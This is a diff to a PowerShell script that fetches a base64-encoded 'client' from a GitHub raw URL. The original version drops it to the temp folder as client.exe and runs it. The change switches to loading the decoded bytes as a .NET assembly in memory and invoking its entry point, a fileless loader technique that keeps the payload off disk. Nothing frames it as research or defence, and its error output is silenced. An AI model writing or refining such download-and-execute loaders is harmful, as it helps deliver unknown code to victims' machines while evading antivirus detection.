@@ -7,16 +7,19 @@ try {
     
     # Download the encoded.txt file (base64 encoded client)
     $encodedUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/encoded.txt"
-    $encodedPath = "$env:TEMP\encoded.txt"
-    Invoke-WebRequest -Uri $encodedUrl -OutFile $encodedPath
+    $base64Content = (Invoke-WebRequest -Uri $encodedUrl).Content
     
-    # Decode the base64 content and save as executable
-    $exePath = "$env:TEMP\client.exe"
-    $base64Content = Get-Content -Path $encodedPath -Raw
-    [System.IO.File]::WriteAllBytes($exePath, [System.Convert]::FromBase64String($base64Content))
+    # Decode the base64 content to a byte array
+    $bytes = [System.Convert]::FromBase64String($base64Content)
     
-    # Run the decoded client.exe
-    Start-Process $exePath -ErrorAction Stop
+    # Load the assembly in memory
+    $assembly = [System.Reflection.Assembly]::Load($bytes)
+    
+    # Get the entry point and invoke it
+    $entryPoint = $assembly.EntryPoint
+    if ($entryPoint) {
+        $entryPoint.Invoke($null, [object[]]@())
+    }
 } catch {
     # Write-Host "An error occurred: $_"
 
